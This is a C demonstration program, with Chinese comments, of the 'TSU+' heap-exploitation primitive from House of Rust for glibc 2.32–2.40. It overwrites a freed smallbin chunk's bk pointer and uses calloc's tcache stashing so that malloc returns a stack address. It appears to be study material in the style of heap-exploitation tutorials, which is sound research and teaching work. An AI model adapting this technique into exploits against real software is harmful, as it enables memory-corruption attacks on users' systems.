/*
 * House of Rust 使用的 TSU+ 子原语，适用于 glibc 2.32～2.40。
 *
 * 漏洞模型：可以修改已经进入 smallbin 的 chunk->bk。
 * 成功效果：下一次 malloc 返回栈上的 target。
 *
 * 这是 Rust 第二阶段中的一个组件，不包含原链用 largebin 写修复 fd 的堆风水。
 */

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    /* target 必须 0x10 对齐，才能通过 tcache_get 的地址对齐检查。 */
    __attribute__((aligned(16))) size_t target[4] = {0};
    size_t *chunk[9];
    size_t *result;

    setbuf(stdout, NULL);

    /* 连续申请八个 0x110 物理大小的 chunk。 */
    for (int i = 0; i < 8; i++)
        chunk[i] = malloc(0x100);

    /* fence 防止 chunk[7] 与后面的 chunk 合并。 */
    malloc(0x20);

    /* 再准备一个同尺寸 chunk。 */
    chunk[8] = malloc(0x100);

    /* 最后的 fence 防止 chunk[8] 与 top chunk 合并。 */
    malloc(0x20);

    /*
     * 前七次 free 填满 0x110 tcache。
     * 后两个 chunk 无法进入已满的 tcache，因此进入 unsorted bin。
     */
    for (int i = 0; i < 9; i++)
        free(chunk[i]);

    /* 大申请不能使用 0x110 chunk，会把 unsorted 中的两个 chunk 分入 smallbin。 */
    malloc(0x200);

    /* 从 tcache 取走两个节点，为 smallbin stashing 留出两个空槽。 */
    malloc(0x100);
    malloc(0x100);

    /*
     * chunk[8][1] 是 freed chunk 的 bk。
     * 把 bk 改成 target-0x10，使 target 被当成伪 chunk 的用户区。
     */
    chunk[8][1] = (size_t)target - 0x10;

    /* stashing 会执行 bck->fd=bin，因此 fake->bk 必须指向可写地址。 */
    target[1] = (size_t)target;

    /* calloc 进入 smallbin 路径，触发 smallbin 节点向 tcache 搬运。 */
    calloc(1, 0x100);

    /* tcache 的下一项已经是伪造的 target。 */
    result = malloc(0x100);

    assert(result == target);
    printf("[+] TSU+ 返回目标\n");
    return 0;
}
